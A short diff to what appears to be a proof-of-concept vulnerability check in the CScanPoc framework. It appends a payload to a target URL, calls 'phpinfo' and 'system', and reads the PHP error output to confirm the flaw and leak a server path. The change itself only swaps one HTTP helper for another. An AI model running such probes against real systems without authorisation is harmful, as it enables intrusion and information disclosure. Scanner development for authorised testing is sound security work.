@@ -2,6 +2,7 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
+
 import re
 hh = hackhttp.hackhttp()
 
@@ -54,7 +55,7 @@ class Poc(ABPoc):
             url = '{target}'.format(target=self.target)+payload
             code, head, res, errcode, _ = hh.http(url + 'phpinfo')
             if code == 200 and 'PHP Version' in res:
-                code, head, res, errcode, _ = curl.curl(url + 'system')
+                code, head, res, errcode, _ = hh.http(url + 'system')
                 m = re.search(
                     '0 given in <b>([^<]+)</b> on line <b>(\d+)</b>', res)
                 if code == 200 and m:
